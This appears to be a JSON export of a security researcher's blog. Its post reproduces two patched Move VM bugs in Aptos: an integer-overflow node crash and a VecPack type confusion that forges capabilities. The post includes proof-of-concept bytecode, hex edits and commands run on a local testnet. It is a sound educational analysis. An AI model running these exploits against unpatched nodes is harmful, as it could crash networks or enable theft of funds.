{"posts":[{"title":"Reproduce two critical bugs in Move VM and know why","text":"#1: The Crash BugA bug in the move virtual machine can cause crash in aptos applications. Introductionhttps://medium.com/numen-cyber-labs/analysis-of-the-first-critical-0-day-vulnerability-of-aptos-move-vm-8c1fd6c2b98e The Move programming language is used in many well-known projects, like Aptos and Sui. Move virtual machine (movevm) like Ethereum Virtual Machine evm are the same, where it needs to compile the source code into byte code and exectued in the virtual machine. the bytecode is loaded in through the function execute_script Execute load_script function, this function is mainly used to deserialize the bytecode, and verify whether the bytecode is legal, if the verification fails, it will return as a failure After successful verification, the real bytecode code is then executed Execute the bytecode, access or modify the state of global storage, including resources, modules Verification Module before the real execution of bytecode code, verification of bytecode is performed. The verification can be subdivided into a number of sub-processes respectively. *BoundsChecker*, is mainly used to check the boundary security of the module and script. This includes checking the boundary of signature, constants, etc. *DuplicationChecker*, a module that implements a checker to verify whether each vector in a CompiledModule contains different values *SignatureChecker*, which checks that the field structure is correct when the signature is used for function parameters, local variables, and structure members *InstructionConsistency*, which verifies instruction consistency *Constants* are used to verify that constants are of the original type and that the data of constants are correctly serialized to their type *CodeUnitVerifier*, to verify the correctness of the function body code, via stack_usage_verifier.rs and abstract_interpreter.rs respectively *script_signature*, to verify that a script or entry function is a valid signature CodeUnitVerifier The vulnerability existed in the logic of checking stack size check when verifying blocks of code. Specifically, stack_size_increment can be indirectly controlled by constructing an oversized num_pushes, resulting in an integer overflow vulnerability. Reproductioninstall aptos-cli tool: 1$ curl -fsSL &quot;https://aptos.dev/scripts/install_cli.py&quot; | python3 run aptos node 123$ git clone git@github.com:aptos-labs/aptos-core.git ~/aptos-core &amp;&amp; cd ~/aptos-core$ cargo run -p aptos -- node run-local-testnet --with-faucet --faucet-port 8081 --force-restart --assume-yes poc bytecode file Disassemble the bytecode. We can see the code at line 1 and line 2 are two VecUnpack instructions. The function of VecUnpack is to push all the data to the stack when the vector object is encountered in the code. That said the instruction will unpack a statically known number of elements onto the stack. Thus, two lines of code will let VM add 3315214543476364830 and 18394158839224997406 via stack_size_increment += num_pushes;, which is greater than the maximum value of u64 (18446744073709551615). This cause add overflow panic featured by Rust and let the Aptos node crash down. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172$ move new Test$ cp 1.mv Test/$ cd Test$ move sandbox view 1.mv// Move bytecode v4script {main&lt;Ty0: drop, Ty1: drop&gt;(Arg0: u8) {B0: 0: LdU64(3323940208748926750) 1: VecUnpack(2, 3315214543476364830) 2: VecUnpack(2, 18394158839224997406) 3: RetB1: 4: RetB2: 5: RetB3: 6: RetB4: 7: RetB5: 8: RetB6: 9: RetB7: 10: RetB8: 11: RetB9: 12: RetB10: 13: RetB11: 14: RetB12: 15: RetB13: 16: RetB14: 17: Ge 18: RetB15: 19: Or 20: Sub 21: Or 22: VecPopBack(2) 23: RetB16: 24: FreezeRef 25: VecUnpack(2, 163587547629229598) 26: RetB17: 27: RetB18: 28: RetB19: 29: RetB20: 30: RetB21: 31: Or 32: Or 33: Sub 34: RetB22: 35: FreezeRef 36: VecPopBack(2) 37: Ret}} Crash the node: 1$ aptos move run-script --compiled-script-path 1.mv The node backend logs show: #2: The Loss of Found Bug / Type Confusion BugA bug in the move virtual machine can cause loss of found in aptos applications due to type confusion problem. IntroductionLets first see the README document in the move repo for bytecode verifier. https://github.com/move-language/move/tree/96d7dd69c5fe2e1aa2c36831c8d0154c3e3acfe0/language/move-bytecode-verifier So here the bug is happened at the type safety checking stage. Type SafetyThe second phase of the analysis checks that each operation, primitive or defined function, is invoked with arguments of appropriate types. The operands of an operation are values located either in a local variable or on the stack. The types of local variables of a function are already provided in the bytecode. However, the types of stack values are inferred. This inference and the type checking of each operation can be done separately for each block. Since the stack height at the beginning of each block is n and does not go below n during the execution of the block, we only need to model the suffix of the stack starting at n for type checking the block instructions. We model this suffix using a stack of types on which types are pushed and popped as the instruction stream in a block is processed. Only the type stack and the statically-known types of local variables are needed to type check each instruction. We can see the fix commit is to add additional check in VecPack operator. As seen below, previous code didn’t check the consistency of operand types in a vector while after code checks. We see how VecPack specifically works in Move VM. aptos move init --name test_move 1234567module test::test_move{ use std::vector; public fun test() { let v = vector::empty&lt;u64&gt;(); vector::push_back(&amp;mut v, 5); }} move disassemble --name test_move 1234567891011121314module cafe.test_move {public test() {L0: v: vector&lt;u64&gt;B0: 0: VecPack(2, 0) 1: StLoc[0](v: vector&lt;u64&gt;) 2: MutBorrowLoc[0](v: vector&lt;u64&gt;) 3: LdU64(5) 4: VecPushBack(2) 5: Ret}} The first instruction is VecPack. This operator is to initialize a vector. The first parameter represents a type index, which will be parsed into a specific type when compiling. In this example, u64 is the type for this vector. The second parametere represents the number of elements when initializing. Here because we use vector::empty&lt;u64&gt;(), we do not hv element to initialize the vector and the parameter is 0. For example, if we use vector&lt;u64&gt;[0,1,2]; , the second parameter will be 3. 12345678910111213141516171819202122// Move bytecode v5module cafe.test_move {public test() {L0: a: u8L1: num: u8L2: v: vector&lt;u8&gt;B0: 0: VecPack(2, 0) 1: StLoc[2](v: vector&lt;u8&gt;) 2: MutBorrowLoc[2](v: vector&lt;u8&gt;) 3: LdU8(1) 4: VecPushBack(2) 5: MutBorrowLoc[2](v: vector&lt;u8&gt;) 6: VecPopBack(2) 7: StLoc[0](a: u8) 8: ImmBorrowLoc[0](a: u8) 9: Call[0](print&lt;u8&gt;(&amp;u8)) 10: Ret}} That’s introduction of VecPack. Then lets reproduce this vulnerability in an example. ReproductionFirst, clone the aptos project: 1git clone https://github.com/aptos-labs/aptos-core.git Switch to a old commit version. 12git checkout 649fb13e021f8e6a4d28c3410767a9af6106dbb1git switch -c fixed The code in this commit already fixed the bug. So we need to replace the move version in code here. 123456Replace any &quot;77750b37bb3663d00a7c4058937fed42ceb3089e&quot; to &quot;59265662d0a44ba53b09ba3c4b2248efdf08c622&quot; in the repo.Replace any &quot;github.com/aptos-labs/move&quot; to &quot;github.com/move-language/move&quot; in the repo.git add *git commit -m &quot;replace vulnerable move commit 59265662d0a44ba53b09ba3c4b2248efdf08c622&quot; First, open a tmux session and setup a local test aptos environment by following command: 1cargo run --release -p aptos -- node run-local-testnet --with-faucet --faucet-port 8081 --force-restart --assume-yes This command will also build a aptos-cli tool at aptos-core/target/release/aptos for us to interact with the validator node. We can copy this tool to our shell path cp target/release/aptos ~/bin Open another tmux session and publish module to the aptos network. 12aptos initaptos account fund-with-faucet --account default --amount 100000000 Now we published a coin called TestCoin to the local aptos network. TestCoin code: 12345678910111213141516171819202122232425262728293031323334353637383940module TestCoin::test_coin { use aptos_framework::coin; use std::debug; use std::signer; struct TestCoin {} struct OneCap has drop {} struct TwoCap has drop {} fun init_module(sender: &amp;signer) { aptos_framework::managed_coin::initialize&lt;TestCoin&gt;( sender, b&quot;Test Coin&quot;, b&quot;Test&quot;, 6, false, ); } public entry fun balance_of(owner: address) { let balance = coin::balance&lt;TestCoin&gt;(owner); debug::print(&amp;balance); } public fun get_one_cap(): OneCap { return OneCap{} } public fun get_two_cap(): TwoCap { return TwoCap{} } public fun test(one_cap: OneCap) { debug::print(&amp;b&quot;hello&quot;); }} We mainly focus on two structs defined here. one is called OneCap, another is called TwoCap. We have also a function called test, which will print a “hello” being invoked when the parameter is OneCap . 1aptos move publish --named-addresses TestCoin=default As the fix commit shows, we can use VecPack to pack a element of a type into anther targeted type of vector, which later unpacking this vector will give us the targeted type. Our original script looks like this: 12345678910script { use std::vector; fun poc(account: &amp;signer) { let onecap = TestCoin::test_coin::get_one_cap(); let twocap = TestCoin::test_coin::get_two_cap(); let v = vector[twocap]; TestCoin::test_coin::test(onecap); }} This is a valid script, we get a OneCap instance and call test with this onecap. This the details of the above bytecode (move provide a document to eplain their bytecode format https://github.com/move-language/move/blob/main/language/documentation/spec/vm.md) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253MAGICa11c eb0bVERSION0500 0000TABLE_COUNT06 MODULE_HANDLES01 00 02 -&gt; 00 00STRUCT_HANDLES02 02 08 -&gt; 00 01 02 00 00 02 02 00FUNCTION_HANDLES03 0A 0F -&gt; 00 03 02 03 00 -&gt; get_one_cap() 00 04 02 04 00 -&gt; get_two_cap() 00 05 03 02 00 -&gt; test(cap)SIGNATURES05 19 12 -&gt; 01 06 0c -&gt; signer 03 08 00 08 01 0A 08 01 -&gt; 00 01 08 00 -&gt; OneCap 01 08 01 -&gt; TwoCapIDENTIFIERS07 2B 35 -&gt; 09 6d 6f 6f 6e 5f 63 6f 69 6e moon_coin 06 4f 6e 65 43 61 70 OneCap 06 54 77 6F 43 61 70 TwoCap 0b 67 65 74 5f 6f 6e 65 5f 63 61 70 get_one_cap 0b 67 65 74 5f 74 77 6f 5f 63 61 70 get_two_cap 04 74 65 73 74 test ADDRESS_IDENTIFIERS08 60 20 -&gt; 7fde 7f3f aac1 6e02 1829 c3b9 0f2f 65cd d13d 209b 55e5 2ded 1944 31c0 a4ec 6e63Code Head0000 010aCode Content1100 CALL(index-&gt;FUNCTION_HANDLES)0c01 ST_LOC(index-&gt;register)1101 CALL(index-&gt;FUNCTION_HANDLES)0c02 ST_LOC(index-&gt;register)0b02 MOVE_LOC(index-&gt;register)4004 01000000 00000000 VEC_PACK(index-&gt;SIGNATURES, length)01 POP0b01 MOVE_LOC(index-&gt;register)1102 CALL(index-&gt;FUNCTION_HANDLES)02 RET Let’s directly run this script first. 1aptos move run-script --compiled-script-path build/TestCoin/bytecode_scripts/poc.mv --framework-local-dir ~/move-language/aptos-core/aptos-move/framework/aptos-framework The test function will be invoked normally. Now, let’s try to directly call the test function using TwoCap instance. We can do this by modifying the code section in bytecode like below. 12345678910Code Content1100 CALL(index-&gt;FUNCTION_HANDLES)0c01 ST_LOC(index-&gt;register)1101 CALL(index-&gt;FUNCTION_HANDLES)0c02 ST_LOC(index-&gt;register)0b02 MOVE_LOC(index-&gt;register)4004 01000000 00000000 VEC_PACK(index-&gt;SIGNATURES, length)4604 01000000 00000000 VEC_UNPACK(index-&gt;SIGNATURES, length)1102 CALL(index-&gt;FUNCTION_HANDLES)02 RET (Don’t forget also changing the number of instructions in code hearder) After modification, we get the bytecode: 1aptos move run-script --compiled-script-path test_poc.mv --framework-local-dir ~/move-language/aptos-core/aptos-move/framework/aptos-framework No surprises, we get an error: 123{ &quot;Error&quot;: &quot;Simulation failed with status: Transaction Executed and Committed with Error CALL_TYPE_MISMATCH_ERROR&quot;} Because the element in the vector is TwoCap type and we unpack this twocap on the stack, taking it as parameter to call test. But as we mentioned before, the VecPack actually miss a check when packing the elements. We can actually change the type index in the Vecpack instruction and also VecUnpack. Then we cange forge a OneCap using a TwoCap and vector operaion. 1aptos move run-script --compiled-script-path test_poc1.mv --framework-local-dir ~/move-language/aptos-core/aptos-move/framework/aptos-framework We successfully call the test() function. Actually, we understand the bug now and we can simplify the code. call the get_two_cap(), the return value will be pushed on the stack. vecpack the value on the stack, using OneCap index unpack the value back on the stack, the value become OneCap call the test() using the value on stack ret 123451101 CALL(index-&gt;FUNCTION_HANDLES)4003 01000000 00000000 VEC_PACK(index-&gt;SIGNATURES, length)4603 01000000 00000000 VEC_UNPACK(index-&gt;SIGNATURES, length)1102 CALL(index-&gt;FUNCTION_HANDLES)02 RET Our poc works. Moreover, it seems only we can do this via struct. I furthur test changing u64 tou128 and it failed. Internal implementation will raise an error INTERNAL_TYPE_ERROR for casting u64 to u128. This example can happen in real-world application when OneCap is some capability type that should be restricted like MintCapability and TwoCap are not like ViewBalanceCapability. Then it will easily cause loss of found or other severe results.","link":"/Move-compiler/"}],"tags":[],"categories":[],"pages":[{"title":"","text":"google-site-verification: google7418a3f36362ba50.html","link":"/google7418a3f36362ba50.html"},{"title":"","text":"I am a Ph.D. student at The Chinese University of Hong Kong, where I have the fortune of being advised by Prof. Sze Yiu Chau. Before coming to CUHK, I obtained my Bachelor’s degree in Information Security from Jinan University. My research interests are focused on precise program analysis to enhance software security, particularly in modeling security vulnerabilities as program analysis problems. I believe that the more the (good/bad) program patterns are understood, the safer the design becomes. Experiences 2021 - 20?? Start my Ph.D, IE dept., CUHK 2020 - 2021 Research Assistant, MobiTeC, IE dept., CUHK 2019 - 2020 Master of Science in Computer Science, CSE dept., CUHK 2015 - 2019 Bechelor in Information Security, Jinan University Publications Towards Precise Reporting of Cryptographic MisusesYikang Chen, Yibo Liu, Ka Lok Wu, Duc V. Le, Sze Yiu ChauNDSS24 PHYjacking: Physical Input Hijacking for Zero-Permission Authorization Attacks on AndroidXianbo Wang, Shangcheng Shi, Yikang Chen, Wing Cheong LauNDSS22 Others Practical Fingerprint Authorization Hijacking in Android AppsXianbo Wang, Wing Cheong Lau, Yikang Chen, Shangcheng Shi, Ronghai YangBlack Hat Europe 2020","link":"/about/index.html"}]}